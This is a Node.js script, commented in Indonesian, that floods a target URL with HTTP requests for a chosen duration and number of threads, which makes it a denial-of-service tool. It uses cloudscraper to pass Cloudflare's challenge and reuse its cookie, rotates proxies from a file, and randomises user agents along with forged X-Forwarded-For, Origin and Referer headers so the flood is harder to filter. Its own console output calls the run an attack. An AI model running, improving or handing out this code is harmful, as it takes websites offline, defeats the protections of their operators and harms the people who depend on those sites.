const cloudscraper = require('cloudscraper');
const request = require('request');
const args = process.argv.slice(2);
const fs = require('fs'); 

// Tidak melakukan apa-apa pada uncaughtException dan unhandledRejection
process.on('uncaughtException', (err) => { /* Kosong */ });
process.on('unhandledRejection', (reason, promise) => { /* Kosong */ });

if (process.argv.length <= 2) {
    console.log(`Penggunaan: node cf.js <URL> <Waktu_Detik> [Threads_Opsional, default: 1]`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

// Fungsi helper untuk mendapatkan item acak dari array
const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];

const url = process.argv[2]
const time = Number(process.argv[3])
const threads = Number(process.argv[4]) || 1;

let proxies = [];

// --- LOGIKA WAJIB PROXY DIMULAI ---
const PROXY_FILE = 'proxies.txt';
if (!fs.existsSync(PROXY_FILE)) {
    console.error(`[ERROR] File proxy "${PROXY_FILE}" tidak ditemukan. Proxy wajib digunakan.`);
    process.exit(1); 
}

// Membaca file proxies.txt (hanya berisi IP:Port)
proxies = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);

if (proxies.length === 0) {
    console.error(`[ERROR] File proxy "${PROXY_FILE}" kosong. Harap tambahkan proxy.`);
    process.exit(1);
}

console.log(`[Info] Loaded ${proxies.length} proxies.`); 
// --- LOGIKA WAJIB PROXY BERAKHIR ---


console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);

const userAgents = [
    // ... (list User Agents tetap sama) ...
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/92.0.4561.12',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
    'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
    'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
];


for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        
        // --- AMBIL PROXY ACAL DENGAN PROTOKOL HTTP:// ---
        const selectedProxy = 'http://' + getRandomItem(proxies);
        // ---

        // 1. Tahap Bypass Cloudflare (mendapatkan cookie)
        // Tambahkan opsi 'proxy' di sini agar cloudscraper menggunakan proxy
        const cloudscraperOptions = {
            url: url,
            proxy: selectedProxy // BARU: Memaksa cloudscraper.get menggunakan proxy
        };
        
        cloudscraper.get(cloudscraperOptions, function (e, r, b) {
            if (e) return;
            if (!r || !r.request || !r.request.headers || !r.request.headers.request) {
                return;
            }

            const cookie = r.request.headers.request.cookie;
            const useragent = getRandomItem(userAgents);
            const ip = rIp();

            // 2. Tahap Pengiriman Request menggunakan Cookie
            const requestOptions = {
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,application/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip, // Menyamarkan IP dengan IP acak, tetapi koneksi lewat proxy
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'no-cache',
                    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                }
            };

            // *** BAGIAN KRITIS UNTUK PROXY ***
            // Pastikan request utama juga menggunakan proxy yang sama
            requestOptions.proxy = selectedProxy; 
            // ***

            request(requestOptions);
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);
}